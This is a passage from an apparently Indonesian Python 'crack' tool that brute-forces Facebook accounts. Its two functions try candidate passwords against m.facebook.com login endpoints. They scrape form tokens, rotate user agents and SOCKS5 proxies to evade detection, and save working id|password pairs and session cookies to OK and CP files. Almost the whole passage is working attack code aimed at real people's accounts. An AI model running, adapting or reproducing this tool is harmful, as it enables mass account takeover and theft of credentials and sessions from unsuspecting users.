	print(f'{P}┌─[{H}#{P}] OK : {h}%s '%(ok))
	print(f'{P}└─[{k}#{P}] CP : {k}%s{x} '%(cp))
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'┌─{P}[{H}•{P}] Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input(f'{P}└───➢ ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'{P}─────────────────────────────────────────────────────')
		print(f'\t{P}>>{k} Good Bye Dadaahh{P} << ')
		print(f'{P}─────────────────────────────────────────────────────')
		time.sleep(2)
		exit()
		
		
		
#Validate
def crack(idf,pwv):
	global loop,ok,cp
	ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T])
	#sys.stdout.write(f"\r{P} 🐶 [{ewe}{loop}{P}│{b}{len(id)}{P}│{ewe}{idf}{P}][Ok:{H}{ok}{P}][Cp:{k}{cp}{P}] ")
	sys.stdout.write(f"\r{P} 🐶 [{ewe}{loop}{P}/{b}{len(id)}{P}]—[{H}{ok}{P}]—[{k}{cp}{P}] ")
	sys.stdout.flush()
	ua = random.choice(aan)
	#ua = 'NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0.6.23 Chrome/97.0.4692.98 Mobile Safari/537.36 UNTRUSTED/1.0'
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				#print(f'\r{P}└─ {k}{idf}{P}|{k}{pw}{N}')     
				print(f'\r{P} 😔 {k}{idf}{P}|{k}{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P} 😋 {H}{idf}{P}|{H}{pw}\n{P} └─ {H}{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#Async
def crack2(idf,pwv):
	global loop,ok,cp
	ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T])
	sys.stdout.write(f"\r{P}└──[{ewe}{loop}{P}│{b}{len(id)}{P}│{ewe}{idf}{P}][Ok:{H}{ok}{P}][Cp:{k}{cp}{P}]  ")
	sys.stdout.flush()
	ua = random.choice(aan)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({
					"Host": "m.facebook.com", 
					"upgrade-insecure-requests": "1", 
					"user-agent": "Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2729.121 Mobile Safari/537.36", 
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
					"x-requested-with": "com.mi.globalbrowser.mini", 
					"sec-fetch-site":  "none", 
					"sec-fetch-mode": "navigate", 
					"sec-fetch-user": "?1", 
					"sec-fetch-dest": "document", 
					"accept-encoding": "gzip, deflate", 
					"accept-language":  "en-US;q=0.8,en;q=0.7"
					})
			link = ses.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			kontol = {
					'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 
					'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 
					'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 
'try_number': '0', 
'unrecognized_tries': '0', 
'email': idf, 
'pass': pw, 
'prefill_contact_point': '', 
'prefill_source': '', 
'prefill_type': '', 
'first_prefill_source': '', 
'first_prefill_type': '', 
'had_cp_prefilled': 'false', 
'had_password_prefilled': 'false', 
'is_smart_lock': 'false', 
'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)
							}
			apdet = {
"Host": "m.facebook.com", 
"content-length": f"{len(str(kontol))}", 
"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), 
"user-agent": ua, "content-type": 
"application/x-www-form-urlencoded", 
"accept": "*/*", "origin": f"https://m.facebook.com", 
"x-requested-with": "com.mi.globalbrowser.mini", 
"sec-fetch-site": "same-origin", 
"sec-fetch-mode": "cors", 
"sec-fetch-dest": "empty", 
"referer": f"https://m.facebook.com/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", 
"accept-encoding": "gzip, deflate", 
"accept-language": "en-US;q=0.8,en;q=0.7"
						}
			memek = ses.post(f"https://m.facebook.com/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=kontol, headers=apdet,proxies=proxs)
			if "checkpoint" in memek.cookies.get_dict().keys():
				#print(f'\r{P}└─ {k}{idf}{P}|{k}{pw}{N}')     
				print(f'\r{P}┌─ {k}{idf}{P}|{k}{pw}\n{P}└─ {Z}{ua}{N}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}┌─ {H}{idf}{P}|{H}{pw}\n{P}└─ {H}{kuki}{N}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	login()
